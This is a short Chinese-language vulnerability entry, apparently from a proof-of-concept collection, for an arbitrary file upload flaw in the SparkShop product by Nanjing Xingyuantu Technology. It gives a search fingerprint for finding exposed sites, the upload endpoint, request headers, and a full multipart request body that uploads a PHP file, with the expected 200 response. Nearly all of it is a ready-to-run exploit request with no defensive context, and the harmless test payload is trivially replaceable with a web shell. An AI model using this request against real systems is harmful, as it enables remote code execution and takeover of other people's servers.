# 南京星源图科技SparkShop存在任意文件上传漏洞

- **系统**：南京星源图科技　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"SparkShop"`
- **请求**：`POST /api/Common/uploadFile HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`　`Priority: u=0, i`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPii…`　`Content-Length: 178`

**请求体 / payload**
```
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file";filename="1.php"
<?php echo"hello world";?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--
```
- **预期**：200　|　—